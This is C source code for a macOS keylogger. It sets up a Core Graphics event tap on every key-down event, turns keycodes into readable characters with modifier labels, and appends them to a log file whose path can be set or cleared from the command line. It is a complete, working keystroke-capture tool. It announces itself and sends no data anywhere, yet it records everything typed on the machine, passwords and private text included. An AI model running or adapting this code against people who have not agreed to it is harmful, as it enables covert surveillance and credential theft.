#include "keylogger.h"

int main(int argc, const char *argv[]) {

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown)/* | CGEventMaskBit(kCGEventFlagsChanged)*/);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Clear the logfile if clear argument used or log to specific file if given.
    if(argc == 2) {
        if(strcmp(argv[1], "clear") == 0) {
            fopen(logfileLocation, "w");
            printf("%s cleared.\n", logfileLocation);
            fflush(stdout);
            exit(1);
        } else {
            logfileLocation = argv[1];
        }
    }

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");

    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    fprintf(logfile, "\n\nKeylogging has now begun.\n%s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", logfileLocation);
    printf("Press Cmd+. to exit program.\n");
    fflush(stdout);
    CFRunLoopRun();

    return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {

    char resultStr[50] = "";

    CGEventFlags eFlags = CGEventGetFlags(event);

    // check for pressed modifiers (ctrl, alt, cmd)
    char modifierStr[50] = " ";
    if( eFlags & kCGEventFlagMaskControl )  strcat(modifierStr, "[ctrl]");
    if( eFlags & kCGEventFlagMaskAlternate )  strcat(modifierStr, "[alt]");
    if( eFlags & kCGEventFlagMaskCommand ) strcat(modifierStr, "[cmd]");

    // check for [shift] and caps lock 
    bool shift = false;
    if( eFlags & kCGEventFlagMaskShift || eFlags & kCGEventFlagMaskAlphaShift ) shift = true;

    char characterStr[50] = "";
    // Retrieve the keycode as int, convert to char/string and append to resultStr
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    strcat(characterStr, convertKeyCode(keyCode, shift)); 

    // if we have at least one modifier pressed then
    // add space at beginning and end of result and add modifier string to result string
    if (modifierStr[1] != 0) {
        strcat(modifierStr, characterStr);
        strcat(modifierStr, " ");
        strcpy(resultStr, modifierStr);
    } else {
        strcpy(resultStr, characterStr);
    }

/*
    printf("{%i},%s,%i\n", keyCode, resultStr, (int)shift);
    fflush(stdout);
*/    
    
    // Print the human readable key to the logfile.
    fprintf(logfile, "%s", resultStr);
    fflush(logfile);

    return event;
}



// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
const char *convertKeyCode(int keyCode, bool shift) {
    if (keyCode >= 0 && keyCode < 128) 
        return keyCodeMap[keyCode][shift];
    else return "";

}